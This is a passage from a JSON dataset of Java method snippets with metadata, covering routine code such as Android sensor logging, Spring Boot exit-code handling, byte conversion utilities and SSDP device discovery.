["private"], "return_type": "boolean", "snippet": "  private boolean initDefaultSensor() {    if (proximitySensor != null) {      return true;    }    proximitySensor = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);    if (proximitySensor == null) {      return false;    }    logProximitySensorInfo();    return true;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/AppRTCProximitySensor.java", "stars": "2", "class": {"name": "AppRTCProximitySensor", "extends": null, "implements": ["SensorEventListener"], "modifiers": ["public"]}}, {"method_name": "logProximitySensorInfo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void logProximitySensorInfo() {    if (proximitySensor == null) {      return;    }    StringBuilder info = new StringBuilder(\"Proximity sensor: \");    info.append(\"name=\").append(proximitySensor.getName());    info.append(\", vendor: \").append(proximitySensor.getVendor());    info.append(\", power: \").append(proximitySensor.getPower());    info.append(\", resolution: \").append(proximitySensor.getResolution());    info.append(\", max range: \").append(proximitySensor.getMaximumRange());    info.append(\", min delay: \").append(proximitySensor.getMinDelay());    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {      // Added in API level 20.      info.append(\", type: \").append(proximitySensor.getStringType());    }    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {      // Added in API level 21.      info.append(\", max delay: \").append(proximitySensor.getMaxDelay());      info.append(\", reporting mode: \").append(proximitySensor.getReportingMode());      info.append(\", isWakeUpSensor: \").append(proximitySensor.isWakeUpSensor());    }    Log.d(TAG, info.toString());  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/AppRTCProximitySensor.java", "stars": "2", "class": {"name": "AppRTCProximitySensor", "extends": null, "implements": ["SensorEventListener"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        SpringApplication.run(ClientApplication.class, args);    }", "url": "https://raw.githubusercontent.com/ihoneymon/rest-template-of-spring/master/client/src/main/java/io/honeymon/study/resttemplate/client/ClientApplication.java", "stars": "4", "class": {"name": "ClientApplication", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "intToBytes", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] intToBytes(int num) {        byte[] b = new byte[4];        for (int i = 0; i < 4; i++) {            b[i] = (byte) (num >>> (24 - i * 8));        }        return b;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/BitConverterUtil.java", "stars": "1", "class": {"name": "BitConverterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "BytesToInt", "params": ["byte", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int BytesToInt(byte[] b, int start) {        return b[3 + start] & 0xFF |                (b[2 + start] & 0xFF) << 8 |                (b[1 + start] & 0xFF) << 16 |                (b[start] & 0xFF) << 24;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/BitConverterUtil.java", "stars": "1", "class": {"name": "BitConverterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "FloatToBytes", "params": ["float"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] FloatToBytes(float data) {        int intBits = Float.floatToIntBits(data);        return intToBytes(intBits);    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/BitConverterUtil.java", "stars": "1", "class": {"name": "BitConverterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "BytesToFloat", "params": ["byte", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float BytesToFloat(byte[] bytes, int start) {        int i = BytesToInt(bytes, start);        return Float.intBitsToFloat(i);    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/BitConverterUtil.java", "stars": "1", "class": {"name": "BitConverterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addAll", "params": ["Throwable", "ExitCodeExceptionMapper"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid addAll(Throwable exception, ExitCodeExceptionMapper... mappers) {\t\tAssert.notNull(exception, \"Exception must not be null\");\t\tAssert.notNull(mappers, \"Mappers must not be null\");\t\taddAll(exception, Arrays.asList(mappers));\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "ExitCodeGenerators", "extends": null, "implements": ["Iterable"], "modifiers": []}}, {"method_name": "addAll", "params": ["Throwable", "Iterable<ExitCodeExceptionMapper>"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid addAll(Throwable exception, Iterable<? extends ExitCodeExceptionMapper> mappers) {\t\tAssert.notNull(exception, \"Exception must not be null\");\t\tAssert.notNull(mappers, \"Mappers must not be null\");\t\tfor (ExitCodeExceptionMapper mapper : mappers) {\t\t\tadd(exception, mapper);\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "ExitCodeGenerators", "extends": null, "implements": ["Iterable"], "modifiers": []}}, {"method_name": "add", "params": ["Throwable", "ExitCodeExceptionMapper"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid add(Throwable exception, ExitCodeExceptionMapper mapper) {\t\tAssert.notNull(exception, \"Exception must not be null\");\t\tAssert.notNull(mapper, \"Mapper must not be null\");\t\tadd(new MappedExitCodeGenerator(exception, mapper));\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "ExitCodeGenerators", "extends": null, "implements": ["Iterable"], "modifiers": []}}, {"method_name": "addAll", "params": ["ExitCodeGenerator"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid addAll(ExitCodeGenerator... generators) {\t\tAssert.notNull(generators, \"Generators must not be null\");\t\taddAll(Arrays.asList(generators));\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "ExitCodeGenerators", "extends": null, "implements": ["Iterable"], "modifiers": []}}, {"method_name": "addAll", "params": ["Iterable<ExitCodeGenerator>"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid addAll(Iterable<? extends ExitCodeGenerator> generators) {\t\tAssert.notNull(generators, \"Generators must not be null\");\t\tfor (ExitCodeGenerator generator : generators) {\t\t\tadd(generator);\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "ExitCodeGenerators", "extends": null, "implements": ["Iterable"], "modifiers": []}}, {"method_name": "add", "params": ["ExitCodeGenerator"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid add(ExitCodeGenerator generator) {\t\tAssert.notNull(generator, \"Generator must not be null\");\t\tthis.generators.add(generator);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "ExitCodeGenerators", "extends": null, "implements": ["Iterable"], "modifiers": []}}, {"method_name": "iterator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Iterator<ExitCodeGenerator>", "snippet": "\tpublic Iterator<ExitCodeGenerator> iterator() {\t\treturn this.generators.iterator();\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "ExitCodeGenerators", "extends": null, "implements": ["Iterable"], "modifiers": []}}, {"method_name": "getExitCode", "params": [], "throws": null, "modifiers": [], "return_type": "int", "snippet": "\tint getExitCode() {\t\tint exitCode = 0;\t\tfor (ExitCodeGenerator generator : this.generators) {\t\t\ttry {\t\t\t\tint value = generator.getExitCode();\t\t\t\tif (value > 0 && value > exitCode || value < 0 && value < exitCode) {\t\t\t\t\texitCode = value;\t\t\t\t}\t\t\t}\t\t\tcatch (Exception ex) {\t\t\t\texitCode = (exitCode != 0) ? exitCode : 1;\t\t\t\tex.printStackTrace();\t\t\t}\t\t}\t\treturn exitCode;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "ExitCodeGenerators", "extends": null, "implements": ["Iterable"], "modifiers": []}}, {"method_name": "getExitCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int getExitCode() {\t\t\treturn this.mapper.getExitCode(this.exception);\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/ExitCodeGenerators.java", "stars": "47572", "class": {"name": "MappedExitCodeGenerator", "extends": null, "implements": ["ExitCodeGenerator"], "modifiers": ["private", "static"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        requestWindowFeature(Window.FEATURE_NO_TITLE);        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,                WindowManager.LayoutParams.FLAG_FULLSCREEN);        setContentView(R.layout.activity_splash_screen);        TextView tx = findViewById(R.id.splash_app_name);        Typeface adelline_font = Typeface.createFromAsset(getAssets(),  \"fonts/adelline.ttf\");        tx.setTypeface(adelline_font);        Handler handler = new Handler();        handler.postDelayed(new Runnable() {            @Override            public void run() {                startActivity(new Intent(SplashScreenActivity.this, MainActivity.class));                finish();            }        }, 2000);    }", "url": "https://raw.githubusercontent.com/LakshyaKhatri/Lifetime/master/app/src/main/java/com/compiletales/lifetime/SplashScreenActivity.java", "stars": "2", "class": {"name": "SplashScreenActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "markdown2Html", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String markdown2Html(String content){        Parser parser = Parser.builder().build();        HtmlRenderer renderer = HtmlRenderer.builder().build();        Node document = parser.parse(content);        return renderer.render(document);    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/util/MarkdownUtil.java", "stars": "2", "class": {"name": "MarkdownUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "openSocket", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void openSocket() {        if (ssdpClient != null && ssdpClient.isConnected())            return;        try {            InetAddress source = Util.getIpAddress(context);            if (source == null)                return;            ssdpClient = createSocket(source);        } catch (UnknownHostException e) {            e.printStackTrace();        } catch (IOException e) {            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "createSocket", "params": ["InetAddress"], "throws": ["IOException"], "modifiers": ["protected"], "return_type": "SSDPClient", "snippet": "    protected SSDPClient createSocket(InetAddress source) throws IOException {        return new SSDPClient(source);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "start", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void start() {        if (isRunning)            return;        isRunning = true;        openSocket();        scanTimer = new Timer();        scanTimer.schedule(new TimerTask() {            @Override            public void run() {                sendSearch();            }        }, 100, RESCAN_INTERVAL);        responseThread = new Thread(mResponseHandler);        notifyThread = new Thread(mRespNotifyHandler);        responseThread.start();        notifyThread.start();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "sendSearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendSearch() {        List<String> killKeys = new ArrayList<String>();        long killPoint = new Date().getTime() - TIMEOUT;        for (Map.Entry<String, ServiceDescription> entry : foundServices.entrySet()){            if (entry.getValue() == null || entry.getValue().getLastDetection() < killPoint) {                killKeys.add(entry.getKey());            }        }        for (String key : killKeys) {            final ServiceDescription service = foundServices.get(key);            if (service != null) {                notifyListenersOfLostService(service);            }            if (foundServices.containsKey(key))                foundServices.remove(key);        }        rescan();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "stop", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop() {        isRunning = false;        if (scanTimer != null) {            scanTimer.cancel();            scanTimer = null;        }        if (responseThread != null) {            responseThread.interrupt();            responseThread = null;        }        if (notifyThread != null) {            notifyThread.interrupt();            notifyThread = null;        }        if (ssdpClient != null) {            ssdpClient.close();            ssdpClient = null;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "restart", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void restart() {        stop();        start();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "reset", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reset() {        stop();        foundServices.clear();        discoveredServices.clear();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "rescan", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rescan() {        for (DiscoveryFilter searchTarget : serviceFilters) {            final String message = SSDPClient.getSSDPSearchMessage(searchTarget.getServiceFilter());            Timer timer = new Timer();            /* Send 3 times like WindowsMedia */            for (int i = 0; i < 3; i++) {                TimerTask task = new TimerTask() {                    @Override                    public void run() {                        try {                            if (ssdpClient != null)                                ssdpClient.send(message);                        } catch (IOException e) {                            e.printStackTrace();                        }                    }                };                timer.schedule(task, i * 1000);            }        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "addDeviceFilter", "params": ["DiscoveryFilter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addDeviceFilter(DiscoveryFilter filter) {        if (filter.getServiceFilter() == null) {            Log.e(Util.T, \"This device filter does not have ssdp filter info\");        } else {            serviceFilters.add(filter);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "removeDeviceFilter", "params": ["DiscoveryFilter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeDeviceFilter(DiscoveryFilter filter) {        serviceFilters.remove(filter);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "setFilters", "params": ["List<DiscoveryFilter>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFilters(List<DiscoveryFilter> filters) {        serviceFilters = filters;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "isEmpty", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEmpty() {        return serviceFilters.size() == 0;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "handleSSDPPacket", "params": ["SSDPPacket"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleSSDPPacket(SSDPPacket ssdpPacket) {        // Debugging stuff//        Util.runOnUI(new Runnable() {////            @Override//            public void run() {//                Log.d(\"Connect SDK Socket\", \"Packet received | type = \" + ssdpPacket.type);////                for (String key : ssdpPacket.data.keySet()) {//                    Log.d(\"Connect SDK Socket\", \"    \" + key + \" = \" + ssdpPacket.data.get(key));//                }//                Log.d(\"Connect SDK Socket\", \"__________________________________________\");//            }//        });        // End Debugging stuff        if (ssdpPacket == null || ssdpPacket.getData().size() == 0 || ssdpPacket.getType() == null)            return;        String serviceFilter = ssdpPacket.getData().get(ssdpPacket.getType().equals(SSDPClient.NOTIFY) ? \"NT\" : \"ST\");        if (serviceFilter == null || SSDPClient.MSEARCH.equals(ssdpPacket.getType()) || !isSearchingForFilter(serviceFilter))            return;        String usnKey = ssdpPacket.getData().get(\"USN\");        if (usnKey == null || usnKey.length() == 0)            return;        Matcher m = uuidReg.matcher(usnKey);        if (!m.find())            return;        String uuid = m.group();        if (SSDPClient.BYEBYE.equals(ssdpPacket.getData().get(\"NTS\"))) {            final ServiceDescription service = foundServices.get(uuid);            if (service != null) {                foundServices.remove(uuid);                notifyListenersOfLostService(service);            }        } else {            String location = ssdpPacket.getData().get(\"LOCATION\");            if (location == null || location.length() == 0)                return;            ServiceDescription foundService = foundServices.get(uuid);            ServiceDescription discoverdService = discoveredServices.get(uuid);            boolean isNew = foundService == null && discoverdService == null;            if (isNew) {                foundService = new ServiceDescription();                foundService.setUUID(uuid);                foundService.setServiceFilter(serviceFilter);                foundService.setIpAddress(ssdpPacket.getDatagramPacket().getAddress().getHostAddress());                foundService.setPort(3001);                discoveredServices.put(uuid, foundService);                getLocationData(location, uuid, serviceFilter);            }            if (foundService != null)                foundService.setLastDetection(new Date().getTime());        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "getLocationData", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLocationData(final String location, final String uuid, final String serviceFilter) {        try {            getLocationData(new URL(location), uuid, serviceFilter);        } catch (IOException e) {            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "getLocationData", "params": ["URL", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLocationData(final URL location, final String uuid, final String serviceFilter) {        Util.runInBackground(new Runnable() {            @Override            public void run() {                SSDPDevice device = null;                try {                    device = new SSDPDevice(location, serviceFilter);                } catch (IOException e) {                    e.printStackTrace();                } catch (ParserConfigurationException e) {                    e.printStackTrace();                } catch (SAXException e) {                    e.printStackTrace();                }                if (device != null) {                    device.UUID = uuid;                    boolean hasServices = containsServicesWithFilter(device, serviceFilter);                    if (hasServices) {                        final ServiceDescription service = discoveredServices.get(uuid);                        if (service != null) {                            service.setServiceFilter(serviceFilter);                            service.setFriendlyName(device.friendlyName);                            service.setModelName(device.modelName);                            service.setModelNumber(device.modelNumber);                            service.setModelDescription(device.modelDescription);                            service.setManufacturer(device.manufacturer);                            service.setApplicationURL(device.applicationURL);                            service.setServiceList(device.serviceList);                            service.setResponseHeaders(device.headers);                            service.setLocationXML(device.locationXML);                            service.setServiceURI(device.serviceURI);                            service.setPort(device.port);                            foundServices.put(uuid, service);                            notifyListenersOfNewService(service);                        }                    }                }                discoveredServices.remove(uuid);            }        }, true);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "notifyListenersOfNewService", "params": ["ServiceDescription"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void notifyListenersOfNewService(ServiceDescription service) {        List<String> serviceIds = serviceIdsForFilter(service.getServiceFilter());        for (String serviceId : serviceIds) {            ServiceDescription _newService = service.clone();            _newService.setServiceID(serviceId);            final ServiceDescription newService = _newService;            Util.runOnUI(new Runnable() {                @Override                public void run() {                    for (DiscoveryProviderListener listener : serviceListeners) {                        listener.onServiceAdded(SSDPDiscoveryProvider.this, newService);                    }                }            });        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "notifyListenersOfLostService", "params": ["ServiceDescription"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void notifyListenersOfLostService(ServiceDescription service) {        List<String> serviceIds = serviceIdsForFilter(service.getServiceFilter());        for (String serviceId : serviceIds) {            ServiceDescription _newService = service.clone();            _newService.setServiceID(serviceId);            final ServiceDescription newService = _newService;            Util.runOnUI(new Runnable() {                @Override                public void run() {                    for (DiscoveryProviderListener listener : serviceListeners) {                        listener.onServiceRemoved(SSDPDiscoveryProvider.this, newService);                    }                }            });        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "serviceIdsForFilter", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> serviceIdsForFilter(String filter) {        ArrayList<String> serviceIds = new ArrayList<String>();        for (DiscoveryFilter serviceFilter : serviceFilters) {            String ssdpFilter = serviceFilter.getServiceFilter();            if (ssdpFilter.equals(filter)) {                String serviceId = serviceFilter.getServiceId();                if (serviceId != null)                    serviceIds.add(serviceId);            }        }        return serviceIds;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "isSearchingForFilter", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSearchingForFilter(String filter) {        for (DiscoveryFilter serviceFilter : serviceFilters) {            String ssdpFilter = serviceFilter.getServiceFilter();            if (ssdpFilter.equals(filter))                return true;        }        return false;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "containsServicesWithFilter", "params": ["SSDPDevice", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean containsServicesWithFilter(SSDPDevice device, String filter) {//        List<String> servicesRequired = new ArrayList<String>();////        for (JSONObject serviceFilter : serviceFilters) {//        }    //  TODO  Implement this method.  Not sure why needs to happen since there are now required services.        return true;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "addListener", "params": ["DiscoveryProviderListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addListener(DiscoveryProviderListener listener) {        serviceListeners.add(listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "removeListener", "params": ["DiscoveryProviderListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeListener(DiscoveryProviderListener listener) {        serviceListeners.remove(listener);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/discovery/provider/SSDPDiscoveryProvider.java", "stars": "4", "class": {"name": "SSDPDiscoveryProvider", "extends": null, "implements": ["DiscoveryProvider"], "modifiers": ["public"]}}, {"method_name": "example", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "\tpublic Map<String, String> example() {\t\treturn Collections.singletonMap(\"legacy\", \"legacy\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/main/java/smoketest/actuator/SampleLegacyEndpoint.java", "stars": "47572", "class": {"name": "SampleLegacyEndpoint", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "cast", "params": ["Class<?>", "Type", "Object"], "throws": null, "modifiers": ["protected"], "return_type": "Object", "snippet": "    protected Object cast(Class<?> target, Type[] neededGenerics, Object value) {        try {            return Enum.valueOf(target.asSubclass(Enum.class), value.toString().toUpperCase());        } catch (IllegalArgumentException e) {            return null;        }    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/EnumTypeConversion.java", "stars": "3", "class": {"name": "EnumTypeConversion", "extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"method_name": "isApplicable", "params": ["Class<?>", "Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isApplicable(Class<?> target, Object value) {        return target.isEnum();    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/EnumTypeConversion.java", "stars": "3", "class": {"name": "EnumTypeConversion", "extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"method_name": "getParametersRequired", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getParametersRequired() {        return 0;    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/typeconversions/EnumTypeConversion.java", "stars": "3", "class": {"name": "EnumTypeConversion", "extends": "TypeConversion", "implements": null, "modifiers": ["public"]}}, {"method_name": "createParameterHandler", "params": ["MappedStatement", "Object", "BoundSql"], "throws": null, "modifiers": ["public"], "return_type": "ParameterHandler", "snippet": "  public ParameterHandler createParameterHandler(MappedStatement mappedStatement, Object parameterObject, BoundSql boundSql) {    return new DefaultParameterHandler(mappedStatement, parameterObject, boundSql);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/language/VelocityLanguageDriver.java", "stars": "15", "class": {"name": "VelocityLanguageDriver", "extends": null, "implements": ["LanguageDriver"], "modifiers": ["public"]}}, {"method_name": "createSqlSource", "params": ["Configuration", "XNode", "Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "SqlSource", "snippet": "  public SqlSource createSqlSource(Configuration configuration, XNode script, Class<?> parameterType) {    return new VelocitySqlSource(configuration, script.getStringBody(\"\"));  }", "url": 